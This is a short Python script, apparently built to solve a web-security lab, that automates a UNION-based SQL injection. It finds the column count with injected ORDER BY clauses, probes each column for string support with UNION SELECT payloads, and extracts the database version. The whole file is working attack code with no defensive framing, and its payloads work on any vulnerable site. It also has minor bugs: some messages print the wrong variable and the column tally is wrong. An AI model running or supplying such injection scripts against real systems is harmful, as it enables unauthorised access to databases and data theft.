```python
import requests
import sys

def supportString(index, cols, URL):
    nulls = (cols * "null,").split(',')
    print(f"[-] Determining if column {index + 1} supports string...")
    nulls[index] = "'dummy'"
    payload = ",".join(nulls)[:-1]

    response = requests.get(URL + "'+UNION+SELECT+"+ payload +"+--+-+")
    if response.status_code == 200:
        print(f"[+] Column {i + 1} supports string...")
        return index
    else:
        print(f"[-] Column {i + 1} does not support string...")
        return None

def findCols(URL):
    i = 1
    cols = 0
    while True:
        response = requests.get(URL + "'+ORDER+BY+" + str(i) + "+--+-+")
        if response.status_code != 200:
            cols = i - 1
            print(f"[+] No. of columns : {(i -1)}")
            break
        i += 1
    return cols

if len(sys.argv) != 2:
    print(f"[+] USAGE : {sys.argv[0]} <URL of the lab>")
    sys.exit(1)

URL = sys.argv[1]

print("[-] Determining number of columns...")
cols = findCols(URL)

string_indices = []
for i in range(cols):
    string_indices.append(supportString(i, cols, URL))
print(f"[+] {len(string_indices)} column(s) support string in total...")

response = requests.get(URL + "'+UNION+SELECT+@@version,null+--+-+")
print("[-] Getting version info")
if response.status_code == 200:
    print("[+] SUCCESSFUL !!")
else:
    print("[-] Try Harder...")
```